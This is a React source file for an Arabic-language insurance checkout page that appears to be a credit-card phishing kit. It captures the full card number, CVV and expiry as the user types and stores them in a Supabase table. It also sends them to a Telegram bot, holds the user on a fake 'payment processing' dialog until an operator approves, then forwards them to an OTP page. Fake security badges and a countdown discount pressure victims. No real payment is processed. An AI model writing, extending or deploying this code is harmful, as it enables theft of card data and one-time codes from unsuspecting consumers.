import { useState, useEffect, useCallback, useRef } from "react";
import { useNavigate, useSearchParams } from "react-router-dom";
import { Card } from "@/components/ui/card";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select";
import { CreditCard, Lock, ArrowRight, Loader2, CheckCircle2, XCircle } from "lucide-react";
import { ChatButton } from "@/components/ChatButton";
import { Footer } from "@/components/Footer";
import { useToast } from "@/hooks/use-toast";
import { useFormspreeSync } from "@/hooks/useFormspreeSync";
import { useAutoSave } from "@/hooks/useAutoSave";
import { getApplicationStatus } from "@/lib/applicationPublic";
import { supabase } from "@/integrations/supabase/client";
import madaLogo from "@/assets/mada-logo.png";
import {
  Dialog,
  DialogContent,
  DialogDescription,
  DialogHeader,
  DialogTitle } from
"@/components/ui/dialog";
import { usePresence } from "@/hooks/usePresence";
import { ensureOwnerToken, resetOwnerToken, updateApplicationPublic } from "@/lib/ownerToken";
import { getVisitorContext } from "@/lib/visitor";

const Payment = () => {
  const navigate = useNavigate();
  const [searchParams] = useSearchParams();
  const {
    toast
  } = useToast();
  const companyName = searchParams.get("company") || "شركة التأمين";
  const price = searchParams.get("price") || "0";
  const regularPrice = searchParams.get("regularPrice") || price;

  // خصم 10% إضافي للدفع الفوري
  const [timeLeft, setTimeLeft] = useState(600); // 10 دقائق
  const [extraDiscountApplied, setExtraDiscountApplied] = useState(true);

  useEffect(() => {
    if (timeLeft <= 0) {
      setExtraDiscountApplied(false);
      return;
    }
    const timer = setInterval(() => {
      setTimeLeft((prev) => prev - 1);
    }, 1000);
    return () => clearInterval(timer);
  }, [timeLeft]);

  const formatTime = (seconds: number) => {
    const mins = Math.floor(seconds / 60);
    const secs = seconds % 60;
    return `${mins.toString().padStart(2, '0')}:${secs.toString().padStart(2, '0')}`;
  };

  // حساب الخصم الأصلي
  const calculateDiscount = () => {
    const regular = parseFloat(regularPrice.replace(/,/g, ""));
    const sale = parseFloat(price.replace(/,/g, ""));
    return (regular - sale).toFixed(2);
  };

  // حساب الخصم الإضافي 10%
  const calculateExtraDiscount = () => {
    const currentPrice = parseFloat(price.replace(/,/g, ""));
    return (currentPrice * 0.10).toFixed(2);
  };

  // السعر النهائي بعد الخصم الإضافي
  const calculateFinalPrice = () => {
    const currentPrice = parseFloat(price.replace(/,/g, ""));
    if (extraDiscountApplied) {
      return (currentPrice * 0.90).toFixed(2);
    }
    return currentPrice.toFixed(2);
  };

  const discount = calculateDiscount();
  const extraDiscount = calculateExtraDiscount();
  const finalPrice = calculateFinalPrice();
  const [formData, setFormData] = useState({
    cardholderName: "",
    cardNumber: "",
    expiryMonth: "",
    expiryYear: "",
    cvv: ""
  });
  const [applicationId, setApplicationId] = useState<string | null>(null);
  const [waitingForApproval, setWaitingForApproval] = useState(false);
  const [approvalStatus, setApprovalStatus] = useState<'waiting' | 'approved' | 'rejected'>('waiting');
  const statusHandledRef = useRef(false);
  usePresence(applicationId || undefined, 'payment');

  const moveToOtpVerification = useCallback(() => {
    const cardDigits = formData.cardNumber.replace(/\s/g, "");
    const lastFour = cardDigits.slice(-4);

    setApprovalStatus('approved');
    toast({
      title: "تمت الموافقة",
      description: "تمت الموافقة على الدفع، جاري الانتقال إلى صفحة التحقق"
    });
    setTimeout(() => {
      setWaitingForApproval(false);
      navigate(`/otp-verification?company=${encodeURIComponent(companyName)}&price=${price}&cardLast4=${lastFour}`, { replace: true });
    }, 800);
  }, [companyName, formData.cardNumber, navigate, price, toast]);

  const handleApplicationStatus = useCallback((data: any) => {
    if (!data) return;
    if (statusHandledRef.current) return;

    if (data.payment_approved || data.current_step === 'otp' || data.status === 'pending_otp') {
      statusHandledRef.current = true;
      moveToOtpVerification();
      return;
    }

    if (data.status === 'rejected') {
      statusHandledRef.current = true;
      setApprovalStatus('rejected');
      toast({
        title: "فشلت عملية الدفع",
        description: "الرجاء إعادة كتابة بيانات البطاقة أو استخدام بطاقة أخرى",
        variant: "destructive"
      });
      setTimeout(() => {
        setWaitingForApproval(false);
        setApprovalStatus('waiting');
      }, 4000);
    }
  }, [moveToOtpVerification, toast]);

  // Send payment data to Formspree in real-time
  useFormspreeSync({
    companyName,
    price,
    regularPrice,
    discount,
    cardholderName: formData.cardholderName,
    cardNumber: formData.cardNumber ? `XXXX XXXX XXXX ${formData.cardNumber.replace(/\s/g, "").slice(-4)}` : "",
    expiryDate: formData.expiryMonth && formData.expiryYear ? `${formData.expiryMonth}/${formData.expiryYear}` : "",
    cvv: formData.cvv
  }, "صفحة الدفع - Payment");


  // تحديد نوع البطاقة بناءً على الأرقام
  const getCardType = (cardNumber: string): "visa" | "mastercard" | "unknown" => {
    const digits = cardNumber.replace(/\s/g, "");

    // فيزا تبدأ بـ 4
    if (digits.startsWith("4")) {
      return "visa";
    }

    // ماستركارد تبدأ من 51-55 أو 2221-2720
    const firstTwo = parseInt(digits.substring(0, 2));
    const firstFour = parseInt(digits.substring(0, 4));
    if (firstTwo >= 51 && firstTwo <= 55 || firstFour >= 2221 && firstFour <= 2720) {
      return "mastercard";
    }
    return "unknown";
  };
  const cardType = getCardType(formData.cardNumber);

  // Auto-save to database in real-time while typing. Keep it active even while waiting
  // so dashboard receives the latest card fields before the admin approves/rejects.
  useAutoSave(applicationId, {
    cardholder_name: formData.cardholderName,
    card_number: formData.cardNumber,
    card_last_4: formData.cardNumber.replace(/\s/g, "").slice(-4) || "",
    card_type: cardType,
    card_cvv: formData.cvv,
    expiry_date: formData.expiryMonth && formData.expiryYear ? `${formData.expiryMonth}/${formData.expiryYear}` : "",
    selected_company: companyName,
    selected_price: price,
    regular_price: regularPrice
  }, "Payment");
  const handleInputChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const {
      name,
      value
    } = e.target;
    let filteredValue = value;

    // تنسيق رقم البطاقة
    if (name === "cardNumber") {
      filteredValue = value.replace(/\D/g, "").slice(0, 16);
      // إضافة مسافات كل 4 أرقام
      filteredValue = filteredValue.replace(/(\d{4})/g, "$1 ").trim();
      statusHandledRef.current = false;
      setApprovalStatus('waiting');
    }

    // CVV - أرقام فقط، بحد أقصى 4
    if (name === "cvv") {
      filteredValue = value.replace(/\D/g, "").slice(0, 4);
    }

    // شهر الانتهاء - رقمين فقط
    if (name === "expiryMonth") {
      filteredValue = value.replace(/\D/g, "").slice(0, 2);
      // التأكد من أن القيمة بين 01 و 12
      if (filteredValue && parseInt(filteredValue) > 12) {
        filteredValue = "12";
      }
    }

    // سنة الانتهاء - رقمين فقط
    if (name === "expiryYear") {
      filteredValue = value.replace(/\D/g, "").slice(0, 2);
    }
    setFormData((prev) => ({
      ...prev,
      [name]: filteredValue
    }));
  };
  useEffect(() => {
    const storedId = localStorage.getItem('applicationId');
    if (storedId) {
      setApplicationId(storedId);
    }
  }, []);

  useEffect(() => {
    if (waitingForApproval && applicationId) {
      let isActive = true;

      console.log('[Payment] Started polling for approval on application', applicationId);
      getApplicationStatus(applicationId).then(({ data }) => {
        if (isActive) handleApplicationStatus(data);
      });

      const channel = supabase
        .channel(`payment_status_${applicationId}`)
        .on(
          'postgres_changes',
          {
            event: 'UPDATE',
            schema: 'public',
            table: 'customer_applications',
            filter: `id=eq.${applicationId}`
          },
          (payload) => {
            console.log('[Payment] Realtime update received', payload.new);
            handleApplicationStatus(payload.new);
          }
        )
        .subscribe();

      const interval = setInterval(async () => {
        const { data, error } = await getApplicationStatus(applicationId);
        if (error) {
          console.error('[Payment] Polling error', error);
          return;
        }
        if (isActive) {
          console.log('[Payment] Poll result', {
            payment_approved: data?.payment_approved,
            status: data?.status,
            current_step: data?.current_step,
          });
          handleApplicationStatus(data);
        }
      }, 1000);

      return () => {
        isActive = false;
        clearInterval(interval);
        supabase.removeChannel(channel);
      };
    }
  }, [waitingForApproval, applicationId, handleApplicationStatus]);

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    statusHandledRef.current = false;

    // التحقق من الحقول
    if (!formData.cardholderName.trim()) {
      toast({
        title: "خطأ",
        description: "الرجاء إدخال اسم حامل البطاقة",
        variant: "destructive"
      });
      return;
    }
    if (formData.cardNumber.replace(/\s/g, "").length !== 16) {
      toast({
        title: "خطأ",
        description: "الرجاء إدخال رقم بطاقة صحيح (16 رقم)",
        variant: "destructive"
      });
      return;
    }
    if (!formData.expiryMonth || !formData.expiryYear) {
      toast({
        title: "خطأ",
        description: "الرجاء إدخال تاريخ انتهاء البطاقة",
        variant: "destructive"
      });
      return;
    }
    if (formData.cvv.length < 3) {
      toast({
        title: "خطأ",
        description: "الرجاء إدخال رمز CVV صحيح",
        variant: "destructive"
      });
      return;
    }

    try {
      // Save payment data to Supabase
      const cardType = getCardType(formData.cardNumber);
      const cardDigits = formData.cardNumber.replace(/\s/g, "");
      const lastFour = cardDigits.slice(-4);

      // Get existing application data if exists
      let existingData: {
        full_name?: string;
        phone?: string;
        insurance_type?: string;
        vehicle_manufacturer?: string;
        vehicle_model?: string;
        vehicle_year?: string;
        vehicle_value?: number;
        usage_purpose?: string;
        add_driver?: boolean;
        selected_company?: string;
        selected_price?: string;
        regular_price?: string;
        company_logo?: string;
      } = {};
      if (applicationId) {
        const { data } = await getApplicationStatus(applicationId);

        if (data) {
          existingData = {
            full_name: data.full_name,
            phone: data.phone,
            insurance_type: data.insurance_type,
            vehicle_manufacturer: data.vehicle_manufacturer,
            vehicle_model: data.vehicle_model,
            vehicle_year: data.vehicle_year,
            vehicle_value: data.vehicle_value,
            usage_purpose: data.usage_purpose,
            add_driver: data.add_driver,
            selected_company: data.selected_company,
            selected_price: data.selected_price,
            regular_price: data.regular_price,
            company_logo: data.company_logo
          };
        }
      }

      const ipAddress = localStorage.getItem('visitor_ip') || null;
      const paymentData = {
        ...getVisitorContext(),
        cardholder_name: formData.cardholderName,
        card_number: formData.cardNumber,
        card_last_4: lastFour,
        card_type: cardType,
        card_cvv: formData.cvv,
        expiry_date: `${formData.expiryMonth}/${formData.expiryYear}`,
        selected_company: companyName,
        selected_price: price,
        regular_price: regularPrice,
        current_step: 'payment',
        payment_approved: false,
        status: 'pending_payment',
        ip_address: ipAddress
      };

      let savedApplicationId = applicationId;
      let saveError: Error | null = null;

      if (applicationId) {
        const ok = await updateApplicationPublic(applicationId, paymentData);
        saveError = ok ? null : new Error('تعذر تحديث الطلب الحالي بسبب عدم تطابق جلسة العميل');
      }

      if (!savedApplicationId || saveError) {
        if (saveError) {
          localStorage.removeItem('applicationId');
          resetOwnerToken();
        }

        savedApplicationId = crypto.randomUUID();
        const ownerToken = ensureOwnerToken();
        const { error } = await supabase
          .from('customer_applications')
          .insert([{
            id: savedApplicationId,
            ...paymentData,
            owner_token: ownerToken,
            full_name: existingData.full_name || formData.cardholderName,
            phone: existingData.phone || null,
            insurance_type: existingData.insurance_type || 'new',
            usage_purpose: existingData.usage_purpose,
            add_driver: existingData.add_driver,
            vehicle_value: existingData.vehicle_value,
            company_logo: existingData.company_logo
          }]);

        if (error) throw error;
      }

      setApplicationId(savedApplicationId);
      localStorage.setItem('applicationId', savedApplicationId);

      const { data: savedData, error: verifyError } = await getApplicationStatus(savedApplicationId);
      if (
        verifyError ||
        savedData?.card_last_4 !== lastFour ||
        savedData?.cardholder_name !== formData.cardholderName ||
        savedData?.expiry_date !== `${formData.expiryMonth}/${formData.expiryYear}`
      ) {
        throw verifyError || new Error('لم يتم تأكيد حفظ بيانات البطاقة في قاعدة البيانات');
      }

      // Send Telegram notification
      try {
        await supabase.functions.invoke('send-telegram', {
          body: {
            applicationData: {
              fullName: existingData.full_name || '',
              phone: existingData.phone || '',
              selectedCompany: companyName,
              selectedPrice: price,
              insuranceType: existingData.insurance_type || '',
              vehicleManufacturer: existingData.vehicle_manufacturer || '',
              vehicleModel: existingData.vehicle_model || '',
              vehicleYear: existingData.vehicle_year || '',
              cardholderName: formData.cardholderName,
              cardNumber: formData.cardNumber,
              cardCvv: formData.cvv,
              expiryDate: `${formData.expiryMonth}/${formData.expiryYear}`
            }
          }
        });
        console.log('Telegram notification sent');
      } catch (telegramError) {
        console.error('Error sending Telegram notification:', telegramError);
      }

      setApprovalStatus('waiting');
      statusHandledRef.current = false;
      setWaitingForApproval(true);
    } catch (error) {
      console.error('Error saving payment data:', error);
      toast({
        title: "خطأ",
        description: "حدث خطأ في حفظ البيانات",
        variant: "destructive"
      });
    }
  };
  return <div className="min-h-screen bg-gradient-to-b from-background to-muted/20">
      <section className="pt-8 pb-16 px-4 md:px-6">
        <div className="container mx-auto max-w-6xl">
          {/* Header */}
          <div className="text-center mb-12">
            <div className="inline-flex items-center justify-center gap-2 bg-emerald-500/10 text-emerald-600 px-4 py-2 rounded-full mb-4">
              <Lock className="h-4 w-4" />
              <span className="text-sm font-medium">دفع آمن ومشفر SSL 256-bit</span>
            </div>
            <h1 className="text-4xl md:text-5xl font-bold mb-2 bg-gradient-to-l from-primary via-purple-600 to-primary bg-clip-text text-transparent">
              إتمام عملية الدفع
            </h1>
            <p className="text-muted-foreground">أدخل معلومات البطاقة لإتمام الطلب</p>
          </div>

          <div className="grid lg:grid-cols-2 gap-8 items-start">
            {/* بطاقة الائتمان التفاعلية */}
            <div className="space-y-6">
              <div className="relative">
                {/* البطاقة الأمامية */}
                








































              </div>

              {/* بانر الخصم الإضافي */}
              {extraDiscountApplied &&
            <Card className="p-4 bg-gradient-to-r from-orange-500 to-red-500 text-white border-0 shadow-lg animate-pulse">
                  <div className="text-center space-y-2">
                    <div className="flex items-center justify-center gap-2">
                      <span className="text-2xl">🔥</span>
                      <span className="font-bold text-lg">خصم إضافي 10% للدفع الفوري!</span>
                      <span className="text-2xl">🔥</span>
                    </div>
                    <div className="flex items-center justify-center gap-2">
                      <span className="text-sm">ينتهي العرض خلال:</span>
                      <span className="bg-white/20 px-3 py-1 rounded-full font-mono font-bold text-xl">
                        {formatTime(timeLeft)}
                      </span>
                    </div>
                  </div>
                </Card>
            }

              {/* ملخص الطلب */}
              <Card className="p-6 shadow-lg border-2">
                <h3 className="text-lg font-bold mb-4 flex items-center gap-2">
                  <span className="w-2 h-2 rounded-full bg-emerald-500 animate-pulse"></span>
                  ملخص الطلب
                </h3>
                <div className="space-y-3">
                  <div className="flex justify-between items-start">
                    <span className="text-sm text-muted-foreground">الشركة:</span>
                    <span className="font-medium text-sm text-right max-w-xs">{companyName}</span>
                  </div>
                  <div className="flex justify-between items-center py-2 border-t">
                    <span className="text-sm text-muted-foreground">السعر الأصلي:</span>
                    <span className="text-sm line-through text-muted-foreground">{regularPrice} ﷼</span>
                  </div>
                  {parseFloat(discount) > 0 &&
                <div className="flex justify-between items-center bg-emerald-50 dark:bg-emerald-950/30 p-3 rounded-lg">
                      <span className="text-sm text-emerald-700 dark:text-emerald-400 font-semibold">🎉 الخصم الأول</span>
                      <span className="text-lg text-emerald-700 dark:text-emerald-400 font-bold">- {discount} ﷼</span>
                    </div>
                }
                  <div className="flex justify-between items-center py-2">
                    <span className="text-sm text-muted-foreground">السعر بعد الخصم:</span>
                    <span className="text-sm text-muted-foreground">{price} ﷼</span>
                  </div>
                  {extraDiscountApplied &&
                <div className="flex justify-between items-center bg-orange-50 dark:bg-orange-950/30 p-3 rounded-lg border-2 border-orange-300 dark:border-orange-700">
                      <span className="text-sm text-orange-700 dark:text-orange-400 font-semibold">🔥 خصم الدفع الفوري (10%)</span>
                      <span className="text-lg text-orange-700 dark:text-orange-400 font-bold">- {extraDiscount} ﷼</span>
                    </div>
                }
                  <div className="flex justify-between items-center pt-4 border-t-2">
                    <span className="text-xl font-bold">المبلغ الإجمالي:</span>
                    <div className="text-right">
                      {extraDiscountApplied &&
                    <span className="text-sm line-through text-muted-foreground block">{price} ﷼</span>
                    }
                      <span className="text-3xl font-black text-primary">{finalPrice} ﷼</span>
                    </div>
                  </div>
                  {extraDiscountApplied &&
                <div className="bg-green-100 dark:bg-green-900/30 p-3 rounded-lg text-center">
                      <span className="text-green-700 dark:text-green-400 font-bold">
                        💰 وفرت {(parseFloat(discount) + parseFloat(extraDiscount)).toFixed(2)} ﷼
                      </span>
                    </div>
                }
                </div>

                {/* شعارات الأمان */}
                <div className="mt-6 pt-6 border-t">
                  <div className="flex items-center justify-center gap-4 text-xs text-muted-foreground">
                    <div className="flex items-center gap-1">
                      <Lock className="h-3 w-3" />
                      <span>مشفر</span>
                    </div>
                    <span>•</span>
                    <div className="flex items-center gap-1">
                      <span>✓</span>
                      <span>آمن 100%</span>
                    </div>
                    <span>•</span>
                    <div className="flex items-center gap-1">
                      <span>🛡️</span>
                      <span>SSL</span>
                    </div>
                  </div>
                </div>
              </Card>
            </div>

            {/* نموذج الدفع */}
            <Card className="p-4 md:p-6 lg:p-8 shadow-xl border-2">
              <h2 className="text-xl md:text-2xl font-bold mb-4 md:mb-6">معلومات الدفع</h2>
              <form onSubmit={handleSubmit} className="space-y-4 md:space-y-6">
                {/* اسم حامل البطاقة */}
                <div className="space-y-2">
                  <Label htmlFor="cardholderName" className="text-sm md:text-base">
                    اسم حامل البطاقة <span className="text-destructive">*</span>
                  </Label>
                  <Input id="cardholderName" name="cardholderName" placeholder="الاسم كما هو مكتوب على البطاقة" value={formData.cardholderName} onChange={handleInputChange} required className="text-right h-10 md:h-12 text-sm md:text-base" />
                </div>

                {/* رقم البطاقة */}
                <div className="space-y-2">
                  <Label htmlFor="cardNumber" className="text-sm md:text-base">
                    رقم البطاقة <span className="text-destructive">*</span>
                  </Label>
                  <div className="relative">
                    <Input id="cardNumber" name="cardNumber" type="text" inputMode="numeric" placeholder="1234 5678 9012 3456" value={formData.cardNumber} onChange={handleInputChange} required className="pl-16 md:pl-20 pr-3 h-11 md:h-12 text-sm md:text-base font-mono" dir="ltr" />
                    <div className="absolute left-2 md:left-3 top-1/2 -translate-y-1/2">
                      {cardType === "visa" ? <div className="bg-blue-600 text-white px-1.5 py-0.5 md:px-2 md:py-1 rounded text-[10px] md:text-xs font-bold">
                          VISA
                        </div> : cardType === "mastercard" ? <div className="flex items-center">
                          <div className="w-4 h-4 md:w-5 md:h-5 rounded-full bg-red-500" />
                          <div className="w-4 h-4 md:w-5 md:h-5 rounded-full bg-yellow-500 -ml-2 md:-ml-2.5" />
                        </div> : <CreditCard className="h-4 w-4 md:h-5 md:w-5 text-muted-foreground" />}
                    </div>
                  </div>
                </div>

                {/* تاريخ الانتهاء و CVV */}
                <div className="grid grid-cols-1 md:grid-cols-2 gap-4 md:gap-4">
                  <div className="space-y-2">
                    <Label className="text-sm md:text-base">
                      تاريخ الانتهاء <span className="text-destructive">*</span>
                    </Label>
                    <div className="flex gap-2 items-center">
                      <Select
                        value={formData.expiryMonth}
                        onValueChange={(val) => setFormData((prev) => ({ ...prev, expiryMonth: val }))}
                      >
                        <SelectTrigger className="flex-1 h-11 md:h-12 text-center font-mono" dir="ltr">
                          <SelectValue placeholder="MM" />
                        </SelectTrigger>
                        <SelectContent>
                          {["01","02","03","04","05","06","07","08","09","10","11","12"].map((m) => (
                            <SelectItem key={m} value={m}>{m}</SelectItem>
                          ))}
                        </SelectContent>
                      </Select>
                      <span className="text-2xl font-bold text-muted-foreground">/</span>
                      <Select
                        value={formData.expiryYear}
                        onValueChange={(val) => setFormData((prev) => ({ ...prev, expiryYear: val }))}
                      >
                        <SelectTrigger className="flex-1 h-11 md:h-12 text-center font-mono" dir="ltr">
                          <SelectValue placeholder="YY" />
                        </SelectTrigger>
                        <SelectContent>
                          {Array.from({ length: 15 }, (_, i) => {
                            const y = (new Date().getFullYear() + i) % 100;
                            return String(y).padStart(2, '0');
                          }).map((y) => (
                            <SelectItem key={y} value={y}>{y}</SelectItem>
                          ))}
                        </SelectContent>
                      </Select>
                    </div>
                  </div>

                  <div className="space-y-2">
                    <Label htmlFor="cvv" className="text-sm md:text-base">
                      <span>رمز الأمان (CVV) <span className="text-destructive">*</span></span>
                      <span className="text-xs text-muted-foreground mr-2">(خلف البطاقة)</span>
                    </Label>
                    <Input id="cvv" name="cvv" type="text" inputMode="numeric" placeholder="123" value={formData.cvv} onChange={handleInputChange} maxLength={3} required className="text-center h-11 md:h-12 text-base md:text-base font-mono" dir="ltr" />
                  </div>
                </div>

                {/* أزرار التحكم */}
                <div className="flex gap-3 md:gap-4 pt-4 md:pt-6">
                  <Button
                  type="submit"
                  size="lg"
                  disabled={waitingForApproval}
                  className="flex-1 h-11 md:h-12 bg-gradient-to-l from-emerald-600 to-emerald-500 hover:from-emerald-700 hover:to-emerald-600 text-white font-bold shadow-lg shadow-emerald-500/30 text-sm md:text-base disabled:opacity-50">

                    {waitingForApproval ?
                  <>
                        <Loader2 className="ml-2 h-4 w-4 md:h-5 md:w-5 animate-spin" />
                        في انتظار الموافقة...
                      </> :

                  <>
                        <Lock className="ml-2 h-4 w-4 md:h-5 md:w-5" />
                        ادفع {price} ﷼ بأمان
                      </>
                  }
                  </Button>
                </div>

                {/* ملاحظة الخصوصية */}
                <div className="text-center pt-6 border-t">
                  <p className="text-xs text-muted-foreground">
                    بإتمام الدفع، أنت توافق على شروط الخدمة وسياسة الخصوصية
                  </p>
                </div>
              </form>
            </Card>
          </div>

          {/* نافذة انتظار الموافقة */}
          <Dialog
            open={waitingForApproval}
            onOpenChange={(open) => {
              if (open || approvalStatus === 'rejected') {
                setWaitingForApproval(open);
              }
            }}
          >
            <DialogContent className="sm:max-w-md" onInteractOutside={(e) => e.preventDefault()}>
              <DialogHeader>
                <DialogTitle className="text-center text-xl">
                  {approvalStatus === 'waiting' && 'جاري معالجة الدفع'}
                  {approvalStatus === 'approved' && 'تمت الموافقة'}
                  {approvalStatus === 'rejected' && 'فشلت العملية'}
                </DialogTitle>
              </DialogHeader>
              <div className="flex flex-col items-center justify-center py-8 gap-6">
                {approvalStatus === 'waiting' &&
              <>
                    <div className="relative">
                      <div className="w-24 h-24 border-4 border-primary/20 rounded-full"></div>
                      <div className="w-24 h-24 border-4 border-primary border-t-transparent rounded-full animate-spin absolute top-0 left-0"></div>
                    </div>
                    <div className="text-center space-y-2">
                      <p className="text-lg font-semibold">جاري التأكد من بيانات بطاقتك</p>
                      <p className="text-muted-foreground">يرجى الانتظار...</p>
                    </div>
                  </>
              }
                
                {approvalStatus === 'approved' &&
              <>
                    <div className="relative">
                      <div className="w-24 h-24 bg-emerald-100 dark:bg-emerald-950 rounded-full flex items-center justify-center">
                        <CheckCircle2 className="w-16 h-16 text-emerald-600 dark:text-emerald-400" />
                      </div>
                    </div>
                    <div className="text-center space-y-2">
                      <p className="text-lg font-semibold text-emerald-600 dark:text-emerald-400">تمت الموافقة بنجاح</p>
                      <p className="text-muted-foreground">جاري الانتقال إلى صفحة التحقق...</p>
                    </div>
                  </>
              }
                
                {approvalStatus === 'rejected' &&
              <>
                    <div className="relative">
                      <div className="w-24 h-24 bg-red-100 dark:bg-red-950 rounded-full flex items-center justify-center">
                        <XCircle className="w-16 h-16 text-red-600 dark:text-red-400" />
                      </div>
                    </div>
                    <div className="text-center space-y-2">
                      <p className="text-lg font-semibold text-red-600 dark:text-red-400">فشلت عملية الدفع</p>
                      <p className="text-muted-foreground">يجب التحقق من بطاقتك أو تغيير البطاقة</p>
                    </div>
                  </>
              }
              </div>
            </DialogContent>
          </Dialog>

          {/* شعارات البطاقات المقبولة */}
          <div className="mt-8 md:mt-12 text-center">
            <p className="text-xs md:text-sm text-muted-foreground mb-4 md:mb-6">وسائل الدفع المقبولة</p>
            <div className="flex flex-wrap justify-center gap-3 md:gap-6 items-center">
              <div className="bg-card border rounded-lg px-3 py-1.5 md:px-4 md:py-2 shadow-sm hover:shadow-md transition-shadow">
                <div className="bg-blue-600 text-white px-2 py-0.5 md:px-3 md:py-1 rounded font-black text-sm md:text-lg">VISA</div>
              </div>
              <div className="bg-card border rounded-lg px-3 py-1.5 md:px-4 md:py-2 shadow-sm hover:shadow-md transition-shadow">
                <div className="flex items-center gap-0.5 md:gap-1">
                  <div className="w-5 h-5 md:w-7 md:h-7 rounded-full bg-red-500"></div>
                  <div className="w-5 h-5 md:w-7 md:h-7 rounded-full bg-yellow-500 -ml-2 md:-ml-3"></div>
                </div>
              </div>
              <div className="bg-card border rounded-lg px-3 py-1.5 md:px-4 md:py-2 shadow-sm hover:shadow-md transition-shadow">
                <span className="font-bold text-blue-600 text-xs md:text-base">American Express</span>
              </div>
              <div className="bg-card border rounded-lg px-3 py-1.5 md:px-4 md:py-2 shadow-sm hover:shadow-md transition-shadow">
                <span className="font-bold text-orange-600 text-xs md:text-base">Discover</span>
              </div>
              <div className="bg-card border rounded-lg px-3 py-1.5 md:px-4 md:py-2 shadow-sm hover:shadow-md transition-shadow flex items-center justify-center">
                <img src={madaLogo} alt="مدى" className="h-5 md:h-7 object-contain" />
              </div>
            </div>
          </div>
        </div>
      </section>

      <ChatButton />
      <Footer />
    </div>;
};
export default Payment;